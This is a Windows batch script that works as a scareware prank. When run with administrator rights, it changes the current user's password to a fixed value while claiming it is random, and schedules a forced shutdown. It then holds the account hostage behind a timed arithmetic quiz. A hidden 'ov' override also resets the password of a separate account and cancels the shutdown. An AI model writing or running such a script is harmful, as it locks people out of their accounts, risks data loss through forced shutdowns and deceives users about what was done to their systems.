@echo off
setlocal enabledelayedexpansion
color 4
title LOG
color a
color 4
color a
color 4
color a
color 4

net user %USERNAME% 123 >nul 2>&1
if %errorlevel% NEQ 0 (
    echo Run file as administrator and try again.
    echo Press any key to exit.
    pause >nul
    exit
)
:shutdown
shutdown /s /t 62 >nul
echo Do not close this. Your password has been changed to a random value. To reset your password, answer the questions in 60 seconds before shutdown.
echo.
timeout /t 1 >nul
echo You have one chance at getting your password back. Math.
echo.
timeout /t 1 >nul
:first
echo [QUESTION 1] 5 + 8
set /p one=""
if "!one!" NEQ "13" (
    if "!one!" EQU "ov" (
        net user si atl
        shutdown /a
        goto panel
    )
    echo Wrong. Try again in 3 seconds.
    timeout /t 1 >nul
    echo Wrong. Try again in 2 seconds.
    timeout /t 1 >nul
    echo Wrong. Try again in 1 second.
    timeout /t 1 >nul
    goto first
)
echo Correct!
:second
echo [QUESTION 2] 6 x 14
set /p two=""
if "!two!" NEQ "84" (
    echo Wrong. Try again in 3 seconds.
    timeout /t 1 >nul
    echo Wrong. Try again in 2 seconds.
    timeout /t 1 >nul
    echo Wrong. Try again in 1 second.
    timeout /t 1 >nul
    goto second
)
echo Correct!
:third
echo [QUESTION 3] 71 - 44
set /p three=""
if "!three!" NEQ "27" (
    echo Wrong. Try again in 3 seconds.
    timeout /t 1 >nul
    echo Wrong. Try again in 2 seconds.
    timeout /t 1 >nul
    echo Wrong. Try again in 1 second.
    timeout /t 1 >nul
    goto third
)
echo Correct!
:fourth
echo [FINAL QUESTION] 60 / 40
set /p four=""
if "!four!" NEQ "1.5" (
    echo Wrong. Try again in 3 seconds.
    timeout /t 1 >nul
    echo Wrong. Try again in 2 seconds.
    timeout /t 1 >nul
    echo Wrong. Try again in 1 second.
    timeout /t 1 >nul
    goto fourth
)
shutdown /a
echo Congratulations! You are safe.
timeout /t 1 >nul
:reset
set /p newpass="To reset your password, type the new password here:"
echo Are you 100 PERCENT SURE you would like to change your password to %newpass%? This will be your new password!
set /p confirm="[Y]es, [N]o --]>"
if /i "!confirm!" EQU "y" (
    net user %USERNAME% %newpass%
    echo Password reset. New password: %newpass%
    echo Press any key to exit.
    pause >nul
    exit
) else if /i "!confirm!" EQU "n" (
    echo Reset cancelled.
    echo Press any key to return to pass reset...
    pause >nul
    goto reset
) else (
    echo Invalid option, enter y/n
    echo Press any key to return to pass reset...
    pause >nul
    goto reset
)
:panel
echo ovr by kombat - ps reset to default
pause >nul
